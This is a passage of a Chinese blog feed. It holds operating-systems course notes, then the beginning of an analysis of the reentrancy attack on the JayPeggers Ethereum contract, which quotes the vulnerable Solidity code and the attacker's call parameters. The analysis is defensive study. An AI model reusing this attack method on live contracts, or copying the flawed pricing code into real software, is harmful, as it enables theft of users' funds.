id="系统的存储管理">系统的存储管理</h2><p>为了实现虚拟内存，操作系统需要实现读取策略（如何调入页）、放置策略（放在内存的哪个位置）、置换策略（把不需要的数据从内存置换出去）、驻留集管理（需要加载进程的哪些资源）等等。</p><p><strong>读取策略</strong>主要关注请求调页和预调页。请求调页是指如何将需要的页面调入内存，避免缺页的发生和如何处理缺页。预调页是额外读取页面，相当于做好缓存，但是需要确定命中。如果额外读取的页面未使用，则低效。</p><p><strong>放置策略</strong>是确定进程驻留在内存中的哪个位置，比如分区系统中的首次匹配、下次匹配等算法，就是属于这一类策略。</p><p><strong>置换策略</strong>是读取新页时，选择淘汰哪些页面。置换做的好，把最不可能访问的页面淘汰，可以合理分配内存。锁定一些页框不淘汰，也可以降低缺页率。基本的置换算法如下：</p><ol><li><p>最佳置换。置换下次访问距当前时间最长的页面。但是这很理想化，因为可能不知道所有页面未来读取的时间，除非已经知道未来页面的访问顺序了。</p></li><li><p>最近最少使用。置换最长时间未引用的页面。这就需要给页面增加最近访问的时间戳，开销大。</p></li><li><p>先进先出。采取严格的单向队列，按照循环的方式，删除最先进来的页面，也就是驻留在内存中时间最长的页面。问题明显，驻留时间最长，不代表不需要。</p></li><li><p>时钟置换。本质上是淘汰最近没有使用的页。规则如下：</p><ul><li><p>当页面载入或者再次读取时，页面的使用位设置为 1。未使用的缓冲区，使用未设位 0.</p><img src="http://cdn.blog-blockchain.xyz/202302102323639.png"  /></li><li><p>当访问的页面不存在时，就会从指针的位置开始旋转，如果当前指针指向的页面的使用位为 1，那么就置为 0，继续到下一个位置。如果当前指向的页面使用位为 0，那么就就装入。</p><p><img src="http://cdn.blog-blockchain.xyz/202302102334642.png" alt="图片.png"></p></li><li><p>当命中时，指针位置不变。</p></li></ul></li></ol><p><strong>驻留集管理</strong>指进程运行过程中哪些页面需要加载进来。这需要确定进程当前活动需要多少个页框，这可以固定分配，也可变分配。当发生缺页时，需要确定置换的范围，是在一个进程的空间中置换，还是允许整个内存的范围内置换。具体细节暂时放下。</p><h1>IO 管理和磁盘调度</h1><h2 id="IO-控制方式">IO 控制方式</h2><p>IO 的基本控制方式有轮询(忙等方式)、中断驱动、DMA、通道控制。</p><p><strong>轮询</strong>是通过程序完成的，需要 IO 时会通过 CPU 给 IO 控制器发出命令，然后进程阻塞，CPU 不断轮询控制器的状态，直到就绪之后<strong>经过 CPU 读入内存</strong>。</p><img src="http://cdn.blog-blockchain.xyz/202302110001662.png" alt="image-20230211000155595" style="zoom: 67%;" /><p><strong>中断驱动</strong>则智能一些，CPU 发送指令之后，如果是非阻塞的指令，那么继续执行进程，如果是阻塞的指令，则当前进程被换出，调度其他进程。CPU 不用轮询其他进程，而是等待 IO 控制器返回消息后，再执行需要这 IO 的程序。<strong>每次传输一个数据就会发送中断</strong>。</p><p><strong>DMA</strong> 这个模块会直接和 IO 控制器通信，CPU 可以去做其他事情，<strong>DMA 直接向存储器读或写数据</strong>，等待 DMA 完成了所有事情，再通知 CPU 处理，这时 CPU 处理的工作切换了，发送中断。</p><table><thead><tr><th></th><th>中断驱动</th><th>DMA</th></tr></thead><tbody><tr><td>中断频率</td><td>每次传输一个数据即产生中断。</td><td>一块数据全部传送结束时才中断 CPU。</td></tr><tr><td>数据传输</td><td>数据传送在中断处理时由 CPU 控制完成。</td><td>数据传送在 DMA 控制器的控制下完成。</td></tr></tbody></table><p>可以知道，中断适合小数据快速传输，DMA 适合大数据传输。</p><p><strong>通道控制</strong>，某些 IO 设备（如存储器）需要被多用户共用，那么就可能存在多通道，每个通道又由多个控制器管理，每个控制器又连接多个设备。通道控制是 DMA 的升级版本，有自己的 IO 指令集，甚至自己就是微型计算机，并行的操作，读取速度更加快。</p><img src="http://cdn.blog-blockchain.xyz/202302110017351.png" alt="image-20230211001757301" style="zoom: 67%;" /><h2 id="IO-缓冲">IO 缓冲</h2><p>缓冲是指发出读取请求之前就开始读取数据，发出写入请求一段时间后才开始写入数据。</p><ul><li><p>没有缓冲时，数据单次的到达进程或者从进程送出，那么每次数据传输都需要计算和整个 IO 过程的时间。</p></li><li><p>当采用单缓冲时，进程的多次数据请求时，就可以一边计算一边缓冲，然后整个的传输到进程。这节省了传输时间。</p><img src="http://cdn.blog-blockchain.xyz/202302110031185.png" alt="image-20230211003158127" style="zoom:50%;" /></li><li><p>双缓冲有两个缓冲区，系统使用一个缓冲区传输数据时，就可以填充另外一个缓冲区，这样切换着执行，就几乎感受不到数据存设备读取到内存的时间。多个缓冲区时，原理也是类似的。</p><img src="http://cdn.blog-blockchain.xyz/202302110032606.png" alt="image-20230211003250549" style="zoom: 50%;" /></li></ul><p>缓冲缓解了 IO 设备速度太慢的问题，相比 CPU 的执行速度，IO 设备先攒一波，再传输数据，可以减少 CPU 等待时间和中断数量。</p><p>磁盘中的缓冲技术中典型的有<strong>SPOOLing</strong>，它在磁盘中建立 IO 缓冲区，对 IO 设备的输入和从 IO 设备的读取，都在磁盘的这个区域进行。也就是说，在计算机中开辟一块存储位置，用来缓冲 IO，程序实际读取的数据来此这个缓冲区（更具体的是通过输入井和输出井），而缓冲区作为操作系统和 IO 设备之间的中介或者代理。所以 SPOOLing 的全称叫做 Simultaneous Peripheral Operation On-Line，同步同时的外设操作。国内翻译直接叫做假脱机，也是这个意思。</p><p>另外，磁盘内部可能也存在缓冲区，在缓存没有用光的情况下，速度会快很多。管理缓冲区的策略有 LRU(Least Recently Used)，它置换出最近最久没有使用的块；也有 LFU (Least Frequently Used)，置换出最近访问次数最少的块。</p><h2 id="磁盘的结构和读取过程">磁盘的结构和读取过程</h2><p>磁盘存储器的基本结构包括了物理<strong>盘片</strong>，每个磁盘片可能有一个或者两个<strong>存储面</strong>。每个存储面被划分成若干个同心圆，每个圆环就叫做<strong>磁道</strong>。每条圆环状的磁道划分成若干个<strong>扇区</strong>，层叠起来的不同盘片的相同的磁道就叫做<strong>柱面</strong>。</p><p>读取和写入数据的是磁头，有的是每个盘面一个磁头，有的则更加高级，一个盘面上多个磁头，对应着盘面上的磁道。磁头有固定读取某个磁道的类型，也有可以移动到指定磁道的类型。磁盘会高速旋转，这样就实现了读取全盘。</p><img src="http://cdn.blog-blockchain.xyz/202302111444167.png" alt="image-20230211144437037" style="zoom:50%;" /><img src="http://cdn.blog-blockchain.xyz/202302111450182.png" alt="image-20230211145003125" style="zoom: 80%;" /><p>磁盘的读取过程大致如下：在磁头可移动系统中，将磁头臂移动到指定磁道，磁头定位到指定磁道后，等待磁盘旋转，将待访问的扇区移动到磁头位置，向磁盘传送或从磁盘传送数据的时间，取决于磁盘的旋转速度。</p><p>因此磁盘的读取的时间主要有三部分：寻道时间、旋转延迟、传输时间。寻道时间一般是给定的。旋转延迟一般取平均，也就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>r</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mn>2</mn><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T_r=1/(2r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span>，其中 r 表示磁盘旋转速度，一般单位是每分钟多少转 rpm。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">T_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为传输时间，b 表示要传送的字节数，r 表示旋转速度，N 表示一个磁道中的字节数，那么传输时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>t</mi></msub><mo>=</mo><mi>b</mi><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>r</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T_t=b/(rN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>。</p><p>根据以上的规则，看一个示例：考虑一个典型的磁盘，平均寻道时间为 4ms，转速为 7500r/m，每个磁道有 500 个扇区，每个扇区有 512 个字节。假设有一个文件存放在 2500 个扇区上，估算下列两种情况下读取该文件需要的时间。（1）2500 个扇区分别位于 5 个相邻磁道上，且文件按扇区顺序存放；（2）2500 个扇区随机分布。</p><p>（1）转速换算 7500rpm=0.125r/ms，寻道时间 4ms，旋转延迟 1/(2*0.125)=4ms，读取一个扇区的时间 512/(500*512*0.125)=0.016ms。所以连续读取 5 个磁道需要 4ms+4ms*5+0.016ms*2500= 64 ms。<strong>相邻磁道的寻道时间可以忽略</strong></p><p>（2）如果随机分布的话，读写的三个过程必须都出现，2500*(4+4+0.016)ms=20040ms</p><h2 id="磁盘调度策略">磁盘调度策略</h2><p>因为磁头的位置一次只能处理一个请求，如果能够合理调度请求，让上面提到的时间综合起来最短，这就是磁盘调度得目标。</p><p><strong>FIFO 先进先出</strong>，根据进程请求访问磁盘的先后顺序，处理访问的需求。但是大量进程竞争磁盘时，性能接近随机调度。</p><p><strong>PRI 优先级</strong>，根进程读取磁盘安排优先级。</p><p><strong>LIFO 后进先出</strong>优先处理新到的请求。</p><p><strong>SSTF 最短寻道时间优先</strong>选择移动到距离前位置最近的磁道。</p><p><strong>SCAN 电梯算法</strong>磁头只沿着一个方向移动到尽头，然后再往反方向走。</p><p>**C-SCAN (Circular SCAN)**当磁臂沿指定方向扫描到磁盘最后一个磁道时，磁臂返回到反方向末端，再次沿指定方向扫描。记住这是单方向扫描。因为在末端位置的时候，已经扫描过的边缘位置，可能没有必要立即再扫描一遍。</p><p><strong>C-LOOK</strong> 在 C-SCAN 基础上改进，当前方向没有其他请求时，直接到另外一个方向最末端的请求，然后重新开始单方向扫描。</p><p><strong>FSCAN</strong> 使用两个子队列，扫描开始时，所有请求放在一个队列中，另外一个队列为空。在扫描过程中，新到来的请求放在另外一个队列中，当原来队列里的请求处理完毕之后，才会处理另外一个队列。</p><h2 id="RAID">RAID</h2><p>独立磁盘冗余阵列（RAID）是将多个独立的磁盘组成在一起形成一个大的磁盘系统，从而实现比单块磁盘更好的存储性能和更高的可靠性。具体来说，操作系统的眼中它是一个单一设备，但是它的整体性使得单一设备失效的时候，可以通过奇偶校验信息恢复数据，数据并不是单纯地存放在物理驱动器中，而是分布在各个硬盘中，实现条带化，进而实现高性能读取和容错。</p><p>RAID 分成多个等级</p><ul><li><p>level 0 不提供冗余功能，数据被划分成多个条带，条带映射到物理磁盘中。</p><img src="http://cdn.blog-blockchain.xyz/202302120047135.png" alt="image-20230212004707842" style="zoom:67%;" /></li><li><p>level 1 通过简单映像提供冗余功能，没有校验恢复功能，相当于直接备份。写入无优势，但是读取时会快一些。</p><img src="http://cdn.blog-blockchain.xyz/202302120048506.png" alt="image-20230212004824427" style="zoom: 67%;" /></li><li><p>level 2 实现了并行访问数据，提供了数据的校验。往往条带非常小，通过存储每个条带的汉明码确保数据的完整性。</p></li><li><p>…更多的不细究了。</p></li></ul><h1>文件系统</h1><p>这一节，我们更像是了解文件系统是任何设计的，如果读者可以结合自身对 Windows 和 Linux 文件的经验，那么许多部分将会非常好理解。</p><p>文件系统是操作系统的重要组成部分，文件需要以一定的方式组织成特定的结构，然后长期的储存并且被进程访问。文件系统需要提供文件操作的接口，最典型的就是创建、删除、打开、关闭、读写等。文件系统还需要满足数据的管理、权限管理、IO 需求、多用户支持、性能优化等需求。</p><img src="http://cdn.blog-blockchain.xyz/202302120113299.png" alt="image-20230212011347222" style="zoom:50%;" /><p>设备驱动处于最底层，直接和外设通信，负责和控制器通信，给设备发出 IO 请求。基本文件系统则是处理数据存放在外存哪个位置。基本 IO 管理程序则关注磁盘调度、IO 设备调度。逻辑 IO 则是访问记录（<strong>记录是指一组基本数据单元的集合</strong>）和维护文件储存的基本数据。最上面一层则应给用户提供 IO 的接口，支持各自操作。</p><h2 id="文件组织">文件组织</h2><p>文件组织关注文件中记录的逻辑结构，一般需要满足五个原则：快速访问、易于修改、节约存储空间、易于维护、可靠。</p><p><strong>堆文件</strong>是最简单的文件组织方式，数据按照任意顺序排列，记录是变长的，就像随意堆积一样，搜索文件时只能穷举。</p><p><strong>顺序文件</strong>顾名思义就是按照一定的顺序排序，记录是定长的。</p><p><strong>索引顺序文件</strong>在顺序文件的基础上（比如还是保持顺序），添加了文件的关键特征，也就是文件的索引。当添加新的文件时，可以使用索引指向这个文件（溢出文件），然后插入在主文件中，不必实际地移动溢出文件。</p><img src="http://cdn.blog-blockchain.xyz/202302121527859.png" alt="image-20230212152722798" style="zoom: 43%;" /><p><strong>索引文件</strong>则只能通过索引访问记录。</p><p>**直接文件（散列文件）**可以通过哈希直接访问任何地址地数据块。</p><h2 id="文件目录">文件目录</h2><p>根据常识，文件的目录需要包括文件名、文件类型（比如文本文件或者二进制文件）、文件组织（比如目录层级）。从存储的地址方面，需要指示存储在哪个设备（卷）、外存的起始物理地址、文件存储的实际大小、文件大小最大限制。从访问控制的角度来说，需要确定所有者、访问信息（比如密码之类的）、各类用户权限信息。从使用信息来说，需要包括文件的创建时间、创建者、最后一次访问时间、最后一次访问用户、最后一次修改日期、最后一次修改者身份等。</p><p>目录的结构包括单级结构、两级结构、层次结构等。</p><p><strong>单级目录</strong>相当于简单的列表，整个文件系统只有一张目录表，每个目录项对应一个文件。可知，文件名字是不准重复的，而且查找速度慢。</p><img src="http://cdn.blog-blockchain.xyz/202302121746253.png" alt="image-20230212174625152" style="zoom:50%;" /><p><strong>两级结构</strong>则分成主目录和用户目录。主目录给每个用户一个目录项，用户目录则是简单的列表</p><img src="http://cdn.blog-blockchain.xyz/202302121745463.png" alt="image-20230212174552370" style="zoom: 50%;" /><p><strong>树状结构</strong>则可以包含多级目录，每个目录可以包含文件，也可以包含目录。所有的目录都是由根目录引出。任何文件都可以从根目录向下到各个分支来定位。多个文件可以同名，但是确保路径名是唯一的。</p><img src="http://cdn.blog-blockchain.xyz/202302121746361.png" alt="image-20230212174643263" style="zoom:67%;" /><p><strong>无循环图结构</strong>在树型目录的基础上，允许多个目录项指向同一个数据文件或者目录文件，相当于多了软链接。</p><img src="http://cdn.blog-blockchain.xyz/202302122023737.png" alt="image-20230212202318639" style="zoom:50%;" /><h2 id="文件共享">文件共享</h2><p>当文件允许共享时时，就会出现权限控制和并发控制的问题。权限可以大致分成读、写、执行，更加细化可以分成追加、更新、改变权限、删除等。和文件权限相关的用户身份有所有者、特定用户、组用户和全部。 Unix 一般是通过链接实现文件共享。</p><p><strong>硬链接</strong>是将多个文件名链接到同一个索引节点，索引节点会记录引用次数，如果减到 0 那么文件就会被删除。链接文件和被链接文件必须位于同一个文件系统中，而且不允许目录链接。</p><p><strong>软链接</strong>又叫符号链接，软链接文件完全不会影响原文件，它们是互相独立的。</p><h2 id="外存管理">外存管理</h2><p>外存就是各种磁盘之类的存储设备，在外存中，文件由许多的块组成。这些块有三种组织方式定长组块（每个块大小相同）、变长非跨越组块（每个块大小不同且物理上必须连续）、变长跨越组块。</p><img src="http://cdn.blog-blockchain.xyz/202302131952510.png" alt="image-20230213195201427" style="zoom: 67%;" /><p>文件系统会将外存分成一个或多个由一组连续分配的块组成的区域，叫做<strong>分区</strong>。<strong>FAT（文件分配表）<strong>会跟踪分区中的数据结构。文件分配到分区的过程中有</strong>预分配</strong>和<strong>动态分配</strong>两种方式。预分配需要在文件创建时声明文件的最大尺寸，动态分配在需要时才给文件分配空间。文件分配时，<strong>连续分配</strong>的方式是文件由在外存中连续的块组成，隐式的<strong>链式分配</strong>则是类似链表，块串在一块，如果要优化读写也可以合并，变成连续分配。<strong>显式链接</strong>则有些不同，不是采用链表，而是将物理块的指针存储在 FAT 表中。早期的 DOS 系统 FAT12 文件系统，FAT 表里每个项用于表示物理块号的位数是 12 比特，所以如果采用<strong>显式链接</strong>的链式分配，最多支持有 2^12 个物理块。</p><img src="http://cdn.blog-blockchain.xyz/202302132116437.png" alt="image-20230213211600382" style="zoom:50%;" /><p>实际在操作系统中，并不会精确到每一个扇区去存储，可是采用<strong>簇</strong>作为最小单位，一个文件的占用空间大小只能是簇的整数倍。簇越大，越适合大文件的存储，可以节省 FAT 的表项，便于管理。但是存储小文件时，占用空间可能会远超过实际大小。</p><p>除了 FAT（文件分配表）会记录哪些块被使用了，**DAT（磁盘分配表）**用于记录哪些空间没有被使用。DAT 的结构有如下几种情况：</p><ol><li>位表，Bit Tables。使用一个很长的比特向量，向量的每一位对应磁盘中的每一块，用 0 表示空闲，1 表示占用。</li><li>链接空闲分区。采取类似链表的方式，记录下一个空闲区的位置和长度，只需要知道第一个空闲分区的信息即可。</li><li>索引。使用索引表记录空闲空间。</li><li>空白块列表。每个块指定一个序号， 把所有空闲块的序号保存在磁盘中。</li></ol><p><strong>卷</strong>在本质上是指<strong>逻辑磁盘</strong>，是一组在外存上可寻址的扇区的集合，操作系统或应用程序用卷来存储数据。而分区是连续物理块的集合。</p><h2 id="UNIX-文件管理">UNIX 文件管理</h2><p>UNIX 将文件分成 6 类：</p><ol><li>普通文件（Regular, or ordinary），可以视作字节流，可以存储任意数据。</li><li>目录（Directory），包含文件名的列表和指向它的索引节点的指针。</li><li>特殊文件（Special），不包含数据，用于物理设备映射到一个文件名。</li><li>命名管道（Named pipes），用于进程间通信。</li><li>链接文件（Links），硬链接，相当于文件别名。</li><li>符号链接（Symbolic links），相当于软链接。</li></ol><p>UNIX 的所有文件都是通过所有节点管理的，索引节点包含了操作系统需要的文件的所有关键信息。下图就是一个索引节点，它自身就有很多的控制信息，然后包括了指向其他指针的指针和数据的指针。</p><p>值得关注的是，指针可以分成多级，每一级可以管理数据的数量指数级增加。而且数据的存储是采用动态分配的方式，按需分配大小。</p><img src="http://cdn.blog-blockchain.xyz/202302132212967.png" alt="image-20230213221211888" style="zoom: 67%;" /><p>示例：设文件索引节点中有 7 个地址项，其中 4 个地址项为直接地址索引，2 个地址项是一级间接地址索引，1 个地址项是二级间接地址索引，每个地址项大小为 4 字节，若磁盘索引块和磁盘数据块大小均为 256 字节，则可表示的单个文件的最大长度是？</p><p>根据上图的结构可以看到，直接地址直接指向数据块，也就是 4*256=1024 字节=1KB。一级间接地址项指向的索引项（注意<strong>地址项指向索引块</strong>）大小为 256 字节，4 字节一个地址，那么就有 64 个地址项，指向了 64 个数据块。所以支持 2*64*256 B= 32KB。二级间接地址以此类推，1*64*64*256B=1024KB。所以这个索引节点最大支持的文件大小是直接块和间接块之后，也就是 1+32+1024=1057KB。</p><h1>参考和推荐阅读</h1><ul><li><a href="https://www.zbpblog.com/blog-338.html">进程互斥的软件实现方式和硬件实现方法</a></li><li><a href="https://www.cnblogs.com/niuyourou/p/12588407.html">I/O 操作的那些事儿：轮询 ，中断 ， DMA ，通道</a></li><li><a href="https://www.cnblogs.com/Otiger/p/14748569.html">五种 IO 模型和三种实现方式</a></li><li><a href="https://zhuanlan.zhihu.com/p/51170719">RAID 磁盘阵列是什么（一看就懂）</a></li><li><a href="https://blog.csdn.net/qq_44824148/article/details/112037724">操作系统中的『访存次数』</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/C-language-basis/&quot; title=&quot;C语言基础&quot;&gt;C语言基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/modular-inverses/&quot; title=&quot;乘法逆元&quot;&gt;乘法逆元&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/cpp-cryptographic-algorithm-basis/&quot; title=&quot;信息安全算法基础&quot;&gt;信息安全算法基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/OS/&quot; title=&quot;操作系统基础&quot;&gt;操作系统基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/x86-masm/&quot; title=&quot;x86汇编基础&quot;&gt;x86汇编基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/information-theory/&quot; title=&quot;信息论与编码&quot;&gt;信息论与编码&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;</summary>
        
      
    
    
    
    <category term="courses" scheme="https://www.blog-blockchain.xyz/categories/courses/"/>
    
    
    <category term="OS" scheme="https://www.blog-blockchain.xyz/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>JayPeggers 攻击分析</title>
    <link href="https://www.blog-blockchain.xyz/defi/JayPeggers-attack/"/>
    <id>https://www.blog-blockchain.xyz/defi/JayPeggers-attack/</id>
    <published>2022-12-29T15:34:22.000Z</published>
    <updated>2024-11-15T14:30:54.920Z</updated>
    
    <content type="html"><![CDATA[<p>UTU 2022 年 12 月 29 日 5 时（北京时间 13 时），以太坊主网上的 <a href="https://twitter.com/jaypeggerz">JayPeggers</a> 协议遭到重入攻击，损失约 15 ETH。随后攻击者通过 <a href="https://etherscan.io/address/0xd90e2f925da726b50c4ed8d0fb90ad053324f31b">Tornado.Cash</a> 和 <a href="https://etherscan.io/address/0xff1f2b4adb9df6fc8eafecdcbf96a2b351680455">Aztec</a> 转移被盗资金。</p><ul><li>攻击者地址：<a href="https://etherscan.io/address/0x0348d20b74ddc0ac9bfc3626e06d30bb6fac213b">https://etherscan.io/address/0x0348d20b74ddc0ac9bfc3626e06d30bb6fac213b</a></li><li>发起攻击的合约：<a href="https://etherscan.io/address/0xed42cb11b9d03c807ed1ba9c2ed1d3ba5bf37340">https://etherscan.io/address/0xed42cb11b9d03c807ed1ba9c2ed1d3ba5bf37340</a></li><li>发起攻击的交易：<a href="https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6">https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6</a></li><li>被攻击合约：<a href="https://etherscan.io/address/0xf2919D1D80Aff2940274014bef534f7791906FF2">https://etherscan.io/address/0xf2919D1D80Aff2940274014bef534f7791906FF2</a></li><li>调试交易：<a href="https://dashboard.tenderly.co/tx/mainnet/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6">https://dashboard.tenderly.co/tx/mainnet/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6</a></li></ul><h1>分析</h1><p>首先，攻击合约从 Vault(0xba12222222228d8ba445958a75a0704d566bf2c8) 获得借出 72.5 WETH 的代币余额，然后从 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 利用 <code>withdraw</code> 函数取出。至此，攻击者通过闪电贷获得了起始资金。</p><p>接着调用了 <code>buyJay</code>，关键在于计算铸币数量的 <code> ETHtoJAY</code> 函数，它是用 代币总量/ETH 总量，计算代币价格的。这次只是通过 22 WETH 购买了 13584899853779845952188 Jay 代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function buyJay(</span><br><span class="line">        address[] calldata erc721TokenAddress,</span><br><span class="line">        uint256[] calldata erc721Ids,</span><br><span class="line">        address[] calldata erc1155TokenAddress,</span><br><span class="line">        uint256[] calldata erc1155Ids,</span><br><span class="line">        uint256[] calldata erc1155Amounts</span><br><span class="line">    ) public payable &#123;</span><br><span class="line">        require(start, &quot;Not started!&quot;);</span><br><span class="line">        uint256 total = erc721TokenAddress.length;</span><br><span class="line">        if (total != 0) buyJayWithERC721(erc721TokenAddress, erc721Ids);</span><br><span class="line"></span><br><span class="line">        if (erc1155TokenAddress.length != 0)</span><br><span class="line">            total = total.add(</span><br><span class="line">                buyJayWithERC1155(</span><br><span class="line">                    erc1155TokenAddress,</span><br><span class="line">                    erc1155Ids,</span><br><span class="line">                    erc1155Amounts</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        if (total &gt;= 100)</span><br><span class="line">            require(</span><br><span class="line">                msg.value &gt;= (total).mul(sellNftFeeEth).div(2),</span><br><span class="line">                &quot;You need to pay ETH more&quot;</span><br><span class="line">            );</span><br><span class="line">        else</span><br><span class="line">            require(</span><br><span class="line">                msg.value &gt;= (total).mul(sellNftFeeEth),</span><br><span class="line">                &quot;You need to pay ETH more&quot;</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, ETHtoJAY(msg.value).mul(97).div(100));</span><br><span class="line"></span><br><span class="line">        (bool success, ) = dev.call&#123;value: msg.value.div(34)&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;ETH Transfer failed.&quot;);</span><br><span class="line"></span><br><span class="line">        nftsSold += total;</span><br><span class="line"></span><br><span class="line">        emit Price(block.timestamp, JAYtoETH(1 * 10**18));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function ETHtoJAY(uint256 value) public view returns (uint256) &#123;</span><br><span class="line">    return value.mul(totalSupply()).div(address(this).balance.sub(value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击者第二次调用 <code> ETHtoJAY</code> 函数，这次用 50.5 ETH 铸造了 4313025058290613910965927 Jay 代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;erc721TokenAddress&quot;: [</span><br><span class="line">    &quot;0xed42cb11b9d03c807ed1ba9c2ed1d3ba5bf37340&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;erc721Ids&quot;: [</span><br><span class="line">    &quot;0&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;erc1155TokenAddress&quot;: [],</span><br><span class="line">  &quot;erc1155Ids&quot;: [],</span><br><span class="line">  &quot;erc1155Amounts&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道，售卖的 NFT 是一个攻击者自定义的 ERC721 合约，实际上没有任何价值，只是用来通过第 10 行的 <code> buyJayWithERC721</code> 